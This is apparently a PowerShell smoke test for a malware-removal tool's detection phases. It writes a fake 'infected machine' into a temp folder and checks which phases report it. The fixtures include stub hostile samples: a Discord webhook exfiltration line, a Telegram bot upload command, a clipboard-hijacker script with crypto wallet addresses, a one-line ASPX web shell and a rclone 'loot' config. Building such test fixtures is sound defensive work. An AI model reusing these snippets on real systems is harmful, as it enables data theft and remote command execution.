<#
.SYNOPSIS
    RUNTIME smoke test for the Extended band — actually executes engine/Phases-4.ps1.
.DESCRIPTION
    Every other test in this suite is static (AST / regex). This one runs the real phase
    bodies against a synthetic "infected machine": a generated fixture filesystem plus an
    in-memory registry. It is the only test here that can catch a runtime fault —
    a wrong property name, a bad interpolation, an unreachable branch — and it earned its
    place by finding five real bugs on the day the band was written (the @(Get-ScanFiles)
    array-unwrap, an over-escaped \d that disabled a whole allowlist, a $-anchored .lnk
    rule that could never fire, an allowlist that made a Quarantine branch dead code, and
    a phase that threw on a registry value literally named "1").

    It runs on Linux and on Windows. On Linux the fixture paths use '/', so path-SHAPED
    rules (which are written with Windows separators) cannot be exercised here — those are
    covered by the realistic-Windows-path regex cases in Test-Extended-Band.ps1. The two
    tests are complements, not duplicates.

    Windows-only surface is stubbed, and the stub set is verified against the loader via
    the AST, so a renamed or re-signatured helper fails the test instead of silently
    drifting. Nothing outside the temp fixture directory is touched; no scan is run, no
    process is killed, no registry is read or written.
#>
$ErrorActionPreference = 'Continue'
$root = Split-Path -Parent (Split-Path -Parent $PSScriptRoot)
$pass = 0; $fail = 0
function Assert-That { param([string]$Name, $Actual, $Expected)
    if ("$Actual" -eq "$Expected") { $script:pass++ }
    else { $script:fail++; Write-Host ("  FAIL  {0}`n        expected [{1}] got [{2}]" -f $Name, $Expected, $Actual) -ForegroundColor Red } }

# ── the stub contract: every helper below must still exist in the loader ─────
$lt = $null; $le = $null
$loaderAst = [System.Management.Automation.Language.Parser]::ParseFile((Join-Path $root 'Scythe-V23.ps1'), [ref]$lt, [ref]$le)
$loaderFns = @{}
foreach ($f in $loaderAst.FindAll({param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst]}, $true)) { $loaderFns[$f.Name] = $f }
$stubbed = @('Write-RecoveredError','Show-PhaseHeader','Out-Typewriter','Out-Decrypt','Out-ThreatBanner',
             'Invoke-QuantumBar','Show-SectionBanner','Write-Log','ConvertTo-PsLiteral','Add-Finding',
             'Test-InScope','Get-KillParam','Get-Perm','Get-WinEventSafe','Get-FileHashSafe','Get-AuthSig',
             'Get-SignatureVerdict','Get-ProcSnapshot','Get-ScanFiles','Test-ContentRules','Get-RegVal','Get-Sig','Join-AllowRegex')
$missingStub = @($stubbed | Where-Object { -not $loaderFns.ContainsKey($_) })
if ($missingStub.Count) { Write-Host ("  FAIL  stubbed helpers no longer in the loader: {0}" -f ($missingStub -join ', ')) -ForegroundColor Red }
Assert-That 'every stubbed helper still exists in the loader' $missingStub.Count 0
# Add-Finding's parameter set is the one the phases depend on most directly.
$afParams = @($loaderFns['Add-Finding'].Body.ParamBlock.Parameters | ForEach-Object { $_.Name.VariablePath.UserPath })
foreach ($p in @('ID','Phase','ThreatType','Severity','Description','Target','FixAction','FixParam','Group')) {
    Assert-That ("Add-Finding still takes -$p") ($afParams -contains $p) $true
}

$fix = Join-Path ([System.IO.Path]::GetTempPath()) ("scythe_smoke_" + [guid]::NewGuid().ToString('N').Substring(0,8))
try {
New-Item -ItemType Directory -Path $fix -Force | Out-Null
function New-Fixture { param([string]$Rel, [string]$Body)
    $p = Join-Path $fix $Rel
    New-Item -ItemType Directory -Path (Split-Path -Parent $p) -Force | Out-Null
    [System.IO.File]::WriteAllText($p, $Body) }
$W = 'A'*60; $T = 'B'*35
New-Fixture 'AppData/Local/EvilApp/version.dll'        'MZ sideload payload'
New-Fixture 'AppData/Local/EvilApp/RealApp.exe'        'MZ signed host'
New-Fixture 'AppData/Roaming/discord/0.0.309/modules/discord_desktop_core/index.js' `
    ("require('child_process');fetch('https://discord.com/api/webhooks/123456789012345678/$W',{method:'POST'});")
New-Fixture 'AppData/Roaming/discord/0.0.309/resources/app.asar' 'fake asar'
New-Fixture 'AppData/Roaming/discord/0.0.309/resources/app/main.js' '// injected override'
New-Fixture 'AppData/Roaming/Microsoft/AddIns/invoice.xll'  'MZ native excel add-in'
New-Fixture 'AppData/Roaming/Microsoft/Excel/XLSTART/auto.xlam' 'PK startup add-in'
New-Fixture 'AppData/Local/Programs/Notepad2/notepad2.exe'  'MZ patched binary'
New-Fixture 'AppData/Roaming/clip/clipper.ps1' (
    "`$w=@('bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq'," +
    "'1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2'," +
    "'0x742d35Cc6634C0532925a3b844Bc454e4438f44e'," +
    "'0x53d284357ec70cE289D6D64134DfAc8E511c8a3D')`nSet-Clipboard `$w[0]`nGet-Clipboard`n")
New-Fixture 'Downloads/invoice.txt' 'Please remit to bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq'
New-Fixture 'AppData/Roaming/rclone/rclone.conf' ("[loot]`ntype = mega`nuser = a@b.c`npass = " + ('x'*40))
New-Fixture 'Downloads/backup_2026-08-19.7z' 'archive'
New-Fixture 'Downloads/data.zip.001'         'split volume'
New-Fixture 'AppData/Local/Temp/stage.ps1'   "iwr 'https://api.telegram.org/bot1234567890:$T/sendDocument'"
New-Fixture 'AppData/Local/Temp/dg/AutoIt3.exe' 'MZ interpreter'
New-Fixture 'AppData/Local/Temp/dg/script.a3x'  'compiled autoit blob'
New-Fixture 'inetpub/wwwroot/upload.aspx' '<%@ Page Language="C#" %><% eval(Request["cmd"]); %>'
New-Fixture 'Windows/System32/PSEXESVC.exe'  'MZ psexec service'
New-Fixture 'Windows/System32/abcdefgh.exe'  'MZ impacket-style name'

$harness = Join-Path $fix 'run.ps1'
Copy-Item (Join-Path $PSScriptRoot 'ExtendedSmoke.Harness.ps1') $harness
$hostExe = (Get-Process -Id $PID).Path
$out = & $hostExe -NoProfile -File $harness $root $fix 2>&1
$txt = ($out | Out-String)

$phaseLine = ([regex]::Match($txt, 'phases executed\s*:\s*(\d+)')).Groups[1].Value
$recovLine = ([regex]::Match($txt, 'recovered errors\s*:\s*(\d+)')).Groups[1].Value
$findLine  = ([regex]::Match($txt, 'findings\s*:\s*(\d+)')).Groups[1].Value
if (-not $phaseLine) { Write-Host $txt }
Assert-That 'all 18 Extended phases executed'      $phaseLine '18'
Assert-That 'no recovered (terminating) errors'    $recovLine '0'
Assert-That 'the infected fixture produces findings' ([int]$findLine -ge 25) $true

# Each phase that CAN fire on a POSIX-path fixture must have fired.
foreach ($ph in @(116,117,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133)) {
    Assert-That ("PHASE $ph produced a finding") ($txt -match "PHASE $ph\s") $true
}
# The three named destructive fixes must appear with the right action.
Assert-That 'Office test key is DeleteRegKey' ($txt -match 'PHASE 121\s+CRITICAL\s+DeleteRegKey') $true
# False-positive controls: these fixtures are benign and must NOT be reported.
Assert-That 'single wallet address in a text file is not a clipper' ($txt -match 'invoice\.txt') $false
Assert-That 'no finding targets a path outside the fixture tree'    ($txt -match '(?m)^\s+PHASE \d+\s+\S+\s+\S+\s+(?!~)/') $false
}
finally { Remove-Item -LiteralPath $fix -Recurse -Force -ErrorAction SilentlyContinue }

Write-Host ""
if ($fail) { Write-Host ("{0} passed, {1} failed" -f $pass, $fail) -ForegroundColor Red; exit 1 }
Write-Host ("{0} passed, 0 failed" -f $pass) -ForegroundColor Green
